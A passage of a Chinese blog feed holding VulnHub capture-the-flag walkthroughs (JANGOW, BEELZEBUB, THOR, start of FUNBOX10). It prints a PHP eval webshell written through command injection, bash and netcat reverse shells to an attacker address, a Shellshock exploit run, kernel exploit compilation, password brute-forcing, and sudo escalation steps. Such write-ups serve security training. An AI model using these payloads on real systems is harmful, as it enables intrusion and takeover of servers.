href=\"#echo-后门至服务器\">#</a> echo 后门至服务器</h3>\n<p>通过 echo 将 bash 反弹的代码写到目标服务器上</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hv\">http://192.168.31.27/site/busque.php?buscar=echo</span> “bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1’” &gt; <span class=\"exturl\" data-url=\"aHR0cDovLzEuc2g=\">1.sh</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-403.png\">\n<p>写入失败，页面无反应，看来不能写 sh 文件，还得写 php 文件</p>\n<p>写一个 php 一句话后门，判断是否能写上</p>\n<p>echo ‘<?php @eval($_POST['x']); ?>’ &gt;attack.php <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hvJTIwJTI3JTNDP3BocCUyMEBldmFsKCRfUClPU1QlNUIlMjd4JTI3JTVE\">http://192.168.31.27/site/busque.php?buscar=echo '&lt;?php @eval($_P)OST[‘x’]</span>);%20?%3E%27%20%3E%20attack.php;ls</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-404.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; php 一句话后门写入成功</p>\n<p>查看写的文件是否完整</p>\n<p>view-source:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1jYXQlMjBhdHRhY2sucGhw\">http://192.168.31.27/site/busque.php?buscar=cat attack.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-405.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 拿到了网站权限</p>\n<h3 id=\"蚁剑突破网站权限\"><a class=\"markdownIt-Anchor\" href=\"#蚁剑突破网站权限\">#</a> 蚁剑突破网站权限</h3>\n<p>通过蚁剑连接到一句话后门的网站</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9hdHRhY2sucGhw\">http://192.168.31.27/site/attack.php</span> 密码就是 attack.php 文件中的 x</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-406.png\" width=\"620\" alt=\"Image\">\n<p>测试连接成功，可以用来连接网站，尔后可以看到服务器上所有的文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-407.png\" width=\"620\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新建一个 1.php，用来通过php来系统命令反弹shell</span></span><br><span class=\"line\">&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.135</span><br><span class=\"line\"><span class=\"meta prompt_\">4444&gt;</span><span class=\"language-bash\">/tmp/f<span class=\"string\">&quot;);?&gt;</span></span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-408.png\">\n<p>写入文件成功了，但是没有被执行，并且查看文件发现是空的</p>\n<p>view-source:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS8xLnBocA==\">http://192.168.31.27/site/1.php</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-409.png\" width=\"650\" alt=\"Image\"><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-410.png\" width=\"480\" alt=\"Image\"></p>\n<p>换了多个端口都失败了，最后查阅资料，发现服务器关闭了除 443 以外的端口，监听 443 端口，访问 url 地址，将命令执行等待反弹，访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS8xLnBocA==\">http://192.168.31.27/site/1.php</span> 时，命令被执行，shell 成功反弹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-411.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 拿到服务器权限</p>\n<h3 id=\"翻阅文件突破\"><a class=\"markdownIt-Anchor\" href=\"#翻阅文件突破\">#</a> 翻阅文件突破</h3>\n<p>翻阅网站文件，找到数据库配置文件 config.php，有用户名和密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-412.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; /var/www/html/site/wordpress/config.php desafio02:abygurl69</p>\n<p>找到一个网站的备份文件，同样有一个用户名和密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-413.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; /var/www/html/.backup jangow01:abygurl69</p>\n<p>尝试用户名密码登陆，通过 jangow01:abygurl69 登陆成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-414.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 获取到 jangow01 权限</p>\n<h3 id=\"ftp-上传-exp\"><a class=\"markdownIt-Anchor\" href=\"#ftp-上传-exp\">#</a> FTP 上传 EXP</h3>\n<p>服务器存在 s 权限的 pkexec，尝试 pkexec 提权，同时收集到服务器版本为 4.4.0-31 ubuntu</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-415.png\">\n<p>提前准备好的 pkexec exp 在 kali 上，将其发送至靶机上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-416.png\" width=\"440\" alt=\"Image\">\n<p>kali 开启的 python 简易 web 服务器后无法下载，可能被限制了<br>\n而且 ssh 服务并没有启动，用不了 scp 传输文件，并且 ping 不到 kali 机器上</p>\n<p>通过靶机上开放的 ftp 来传输文件，将 CVE-2021-4034 .zip 发送服务器上<br>\n通过 jangow01:abygurl69 成功登陆到了 ftp 服务上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-417.png\" width=\"430\" alt=\"Image\">\n<p>发送 CVE-2021-4034 文件时报错，显示不能发送文件夹</p>\n<p>因此改为了发送 CVE-2021-4034.zip 文件</p>\n<p>继续在反弹的 shell 上执行，当编译时，发现没有 make 命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-418.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 提权失败，需要通过其他的方式提权</p>\n<h3 id=\"searchsploit-提权\"><a class=\"markdownIt-Anchor\" href=\"#searchsploit-提权\">#</a> searchsploit 提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注意到服务器的版本是ubuntu 4.4.0的，用 searchsploit 寻找漏洞</span></span><br><span class=\"line\">searchsploit ubuntu 4.4.0- 31</span><br><span class=\"line\">searshsploit -x linux/local/45010.c 找到payload的确切位置</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-419.png\">\n<p><code>cp /usr/share/exploitdb/exploits/linux/local/45010.c .</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-420.png\" width=\"480\" alt=\"Image\">\n<p>通过 ftp 将内核漏洞权限提升的脚本上传，lcd 可以在 ftp 中用来切换本地的路径，cd 可以在 ftp 中用来切换所属 ftp 服务的主机的目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-421.png\" width=\"410\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将上传的 45010.c文件编译运行</span></span><br><span class=\"line\">gcc 45010.c -o exp</span><br><span class=\"line\">chmod +x exp &amp;&amp; ./exp</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-422.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 提权成功，拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/120%20BEELZEBUB/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/120%20BEELZEBUB/",
            "title": "VULNHUB 20 BEELZEBUB",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmVlbHplYnViLTEsNzQyLw==\">https://www.vulnhub.com/entry/beelzebub-1,742/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2NzkwNjcuaHRtbA==\">https://www.cnblogs.com/sainet/p/15679067.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 BEELZEBUB：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-455.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.102</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.102</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-456.png\" width=\"410\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAy\">http://192.168.31.102</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-457.png\" width=\"520\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.102</code> <br>\n <code>gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.102</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-458.png\" width=\"580\" alt=\"Image\">\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocG15YWRtaW4vZG9jL2h0bWwvaW5kZXguaHRtbA==\">http://192.168.31.102/phpmyadmin/doc/html/index.html</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-459.png\" width=\"580\" alt=\"Image\">\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocG15YWRtaW4v\">http://192.168.31.102/phpmyadmin/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-460.png\" width=\"520\" alt=\"Image\">\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocGluZm8ucGhw\">http://192.168.31.102/phpinfo.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-461.png\" width=\"580\" alt=\"Image\">\n<p>并没有发现可以直接利用的漏洞，用 dirb 做更深的目录结构扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-462.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 还是没有什么发现</p>\n<h3 id=\"源代码信息检索\"><a class=\"markdownIt-Anchor\" href=\"#源代码信息检索\">#</a> 源代码信息检索</h3>\n<p>对已经存在的网址进行源代码的审查: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL2luZGV4LnBocA==\">http://192.168.31.102/index.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-463.png\" width=\"620\" alt=\"Image\">\n<p>猜测这句话的意思是原本存在目录结构为 beelzebub 的目录，为了防止被攻击，将此目录结构以 md5 加密，所以会有一个 beelzebub 的 md5 加密后的目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-464.png\" width=\"620\" alt=\"Image\">\n<p>判断猜测是否正确，搜寻此目录下是否存在其他文件</p>\n<p><code>dirsearch -u http://192.168.31.102/d18e1e22becbd915b45e0e655429d487</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-465.png\" width=\"620\" alt=\"Image\">\n<p>根据目录结构中的许多关键词如 wp 可以判断出这是一个二级 wordpress 站点<br>\n wp-login.php 进入到登陆界面，发现一直在转圈</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-466.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"wpscan-强制扫描\"><a class=\"markdownIt-Anchor\" href=\"#wpscan-强制扫描\">#</a> wpscan 强制扫描</h3>\n<p>通过 wpscan 工具来对网站进行一波用户名的枚举</p>\n<p><code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ --e</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-467.png\" width=\"620\" alt=\"Image\">\n<p>wpscan 扫描失败，根据提示加上对应的参数扫描<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ --enumerate u --ignore-main-redirect</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-468.png\" width=\"620\" alt=\"Image\">\n<p>wpscan 扫描仍然失败，提示的是未检测到此 CMS，加 force 强制扫描<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487 --enumerate u --ignore-main-redirect --force</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-469.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 开始正常扫描，枚举出了两个用户名 valak 和 krampus</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-470.png\" width=\"520\" alt=\"Image\">\n<p>通过已有的用户名来爆破密码<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ -U 'valak,krampus' -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --ignore-main-redirect --force</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-471.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 密码破解失败，无法获取到密码，将从其他 url 地址上寻找突破</p>\n<h3 id=\"cookie-密码泄漏\"><a class=\"markdownIt-Anchor\" href=\"#cookie-密码泄漏\">#</a> cookie 密码泄漏</h3>\n<p>继续访问前边扫描到的 url 地址，看是否有可疑目录<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL2QxOGUxZTIyYmVjYmQ5MTViNDVlMGU2NTU0MjlkNDg3L3dwLWNvbnRlbnQvdXBsb2Fkcy8=\"> http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-472.png\" width=\"520\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL2QxOGUxZTIyYmVjYmQ5MTViNDVlMGU2NTU0MjlkNDg3L3dwLWNvbnRlbnQvdXBsb2Fkcy9UYWxrJTIwVG8lMjBWQUxBSy8=\">http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk To VALAK/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-473.png\" width=\"520\" alt=\"Image\">\n<p>看到一个可以输入语句的对话框，在这里输入个用户名试试什么效果</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-474.png\" width=\"520\" alt=\"Image\">\n<p>输入用户名后，网站的 cookie 信息中爆出来了一个密码；切换用户，输入 krampus 用户，查看到了他的密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-475.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; valak：M4k3Ad3a1 krampus：M4k3Ad3a1</p>\n<p>用 ssh 尝试这两个用户的登录名和密码，进入服务器<br>\n <code>ssh 192.168.31.102 -l valak</code> <br>\n <code>ssh 192.168.31.102 -l krampus</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-476.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功拿到了 krampus 的权限，进入到了服务器</p>\n<h3 id=\"bash_history-查看\"><a class=\"markdownIt-Anchor\" href=\"#bash_history-查看\">#</a> .bash_history 查看</h3>\n<p>cat ~/.bash_history 查看历史命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-477.png\" width=\"370\" alt=\"Image\">\n<p>看到之前有操作过这些命令，很有可能就是提权命令，复现此 exp<br>\n <code>wget http://www.exploit-db.com/download/47009</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-478.png\" width=\"580\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用exp</span></span><br><span class=\"line\">mv 47009 ./exp.c</span><br><span class=\"line\">gcc exp.c -o exp</span><br><span class=\"line\">./exp</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-479.png\" width=\"340\" alt=\"Image\">\n<p>-&gt; 提权成功，拿到了 root 账户的权限</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/119%20THOR/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/119%20THOR/",
            "title": "VULNHUB 19 THOR",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tdGhvciw3MzMv\">https://www.vulnhub.com/entry/hacksudo-thor,733/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDE0NTIuaHRtbA==\">https://www.cnblogs.com/sainet/p/15801452.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 THOR：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-423.png\" width=\"420\" alt=\"Image\">\n<p>查看靶机所在 win 主机的 ip 地址<br>\n <code>ipconfig | find “192.168.31”</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-424.png\" width=\"580\" alt=\"Image\">\n<p>与主机同一 MAC 地址的 ip 地址即为靶机 IP</p>\n<p>也可以登陆路由器后台，查看 win 主机上的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-425.png\" width=\"620\" alt=\"Image\">\n<p>显示有 win 上所有存在过的 ip 地址，以及其 MAC 地址<br>\n -&gt; 靶机 ip：192.168.31.115</p>\n<p>2）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.115</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-426.png\" width=\"410\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21,22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1\">http://192.168.31.115</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-427.png\" width=\"520\" alt=\"Image\">\n<p>先对目标网站进行目录扫描</p>\n<p><code>dirsearch -u http://192.168.31.115/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-428.png\" width=\"470\" alt=\"Image\">\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1L1JFQURNRS5tZA==\">http://192.168.31.115/README.md</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-429.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 管理员的用户名是 “admin”，密码是 “password123”。</p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1L2luZGV4LnBocA==\">http://192.168.31.115/index.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-430.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; 输入用户名和密码之后，显示登录失败，可能此密码在其他地方才能登陆</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-431.png\" width=\"620\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1L2FkbWluX2xvZ2luLnBocA==\">http://192.168.31.115/admin_login.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-432.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 成功登陆到对方网站的后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-433.png\" width=\"480\" alt=\"Image\">\n<h3 id=\"sql-注入测试\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入测试\">#</a> SQL 注入测试</h3>\n<p>翻了翻目录没有什么新的发现</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-434.png\" width=\"520\" alt=\"Image\">\n<p>尝试对登陆的地方进行注入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-435.png\" width=\"520\" alt=\"Image\">\n<p>对登陆的地方进行 burp 抓取数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-436.png\" width=\"630\" alt=\"Image\">\n<p>复制数据包，用 sqlmap 测试发现没有注入点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-437.png\" width=\"400\" alt=\"Image\">\n<h3 id=\"cgi-bin-漏洞\"><a class=\"markdownIt-Anchor\" href=\"#cgi-bin-漏洞\">#</a> cgi-bin 漏洞</h3>\n<p>扩大信息收集面，用 dirb 收集更多的目录结构</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-438.png\" width=\"390\" alt=\"Image\">\n<p>对收集到的 cgi-bin 目录进行更深一级的搜寻<br>\n <code>dirsearch -u http://192.168.31.115/cgi-bin/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-439.png\" width=\"380\" alt=\"Image\">\n<p>-&gt; 敏感目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1L2NnaS1iaW4vc2hlbGwuc2g=\">http://192.168.31.115/cgi-bin/shell.sh</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-440.png\" width=\"420\" alt=\"Image\">\n<p>直接上谷歌搜索 cgi-bin 的漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-441.png\" width=\"520\" alt=\"Image\">\n<p>找到了测试 shellshock 的的命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-442.png\" width=\"620\" alt=\"Image\">\n<p><code>nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh 192.168.31.115</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-443.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 确定了此端口存在 CVE-2014-6271 这个漏洞</p>\n<h3 id=\"msf-攻击-shellshock\"><a class=\"markdownIt-Anchor\" href=\"#msf-攻击-shellshock\">#</a> msf 攻击 shellshock</h3>\n<p>利用 msf 寻找此漏洞进行利用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-444.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search CVE-2014-6271</span><br><span class=\"line\">use exploit/multi/http/apache_mod_cgi_bash_env_exec</span><br><span class=\"line\">set rhosts 192.168.31.115</span><br><span class=\"line\">set targeturi /cgi-bin/shell.sh</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-445.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 成功拿到网站反弹的 shell</p>\n<h3 id=\"searchsploit攻击shellshock\"><a class=\"markdownIt-Anchor\" href=\"#searchsploit攻击shellshock\">#</a> searchsploit 攻击 shellshock</h3>\n<p><code>searchsploit shellshock</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-446.png\" width=\"700\" alt=\"Image\">\n<p><code>searchsploit -x linux/remote/34900.py</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-447.png\" width=\"450\" alt=\"Image\">\n<p><code>cp /usr/share/exploitdb/exploits/linux/remote/34900.py .</code> <br>\n <code>python 34900.py</code> <br>\n 查看此 exp 是如何利用的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-448.png\" width=\"480\" alt=\"Image\">\n<p>根据提示，写全命令行进行攻击</p>\n<p><code>./34900.py payload=reverse rhost=192.168.31.115 lhost=192.168.31.135 lport=5555 pages=/cgi-bin/shell.sh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-449.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 成功拿到反弹后的 shell</p>\n<h3 id=\"pspy64s-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy64s-监控\">#</a> pspy64s 监控</h3>\n<p>翻阅目录，查找到一个备份文件，猜测此备份由高权限执行，直接上 pspy 进行监控</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-450.png\" width=\"380\" alt=\"Image\">\n<p>将 pspy 从 kali 机器上下载下来，赋予 x 权限，然后执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-451.png\" width=\"500\" alt=\"Image\">\n<p>等待监控是否执行了一些特殊命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-452.png\" width=\"590\" alt=\"Image\">\n<p>-&gt; 遗憾的是并没有执行什么特殊任务，不能进行提权</p>\n<h3 id=\"service-提权\"><a class=\"markdownIt-Anchor\" href=\"#service-提权\">#</a> service 提权</h3>\n<p>收集服务器的相关信息，sudo -l 确定了可以调用 thor 去执行一个脚本<br>\n <code>sudo -u thor /home/thor/./hamer.sh</code></p>\n<p>输入 bash 后反弹出来了一个 thor 用户的 shell<br>\n <code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-453.png\" width=\"520\" alt=\"Image\">\n<p>sudo -l 查看 thor 的权限设置，发现其可以直接无密码调用 root 的 service<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v\">https://gtfobins.github.io/</span> 上找到了 service 的提权命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">service 提权</span></span><br><span class=\"line\">sudo service ../../bin/sh</span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-454.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 提权成功最终拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/122%20FUNBOX10/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/122%20FUNBOX10/",
            "title": "VULNHUB 22 FUNBOX10",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZnVuYm94LXVuZGVyLWNvbnN0cnVjdGlvbiw3MTUv\">https://www.vulnhub.com/entry/funbox-under-construction,715/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RpbWVzbGVlcC9hcnRpY2xlL2RldGFpbHMvMTI0MDA1NDM0\">https://blog.csdn.net/timesleep/article/details/124005434</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 FUNBOX10：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-503.png\" width=\"540\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.133</p>\n<p>2）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.133</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-504.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,25,80,110,133</p>\n<p>SMTP（简单邮件传输协议）是用于发送和接收电子邮件的 TCP/IP 协议。但是，由于它在接收端对消息进行排队的能力有限，因此它通常与其他两种协议（POP3 或 IMAP）中的一种一起使用，让用户将消息保存在服务器邮箱中并定期从服务器下载它们。</p>\n<h3 id=\"网站信息收集\"><a 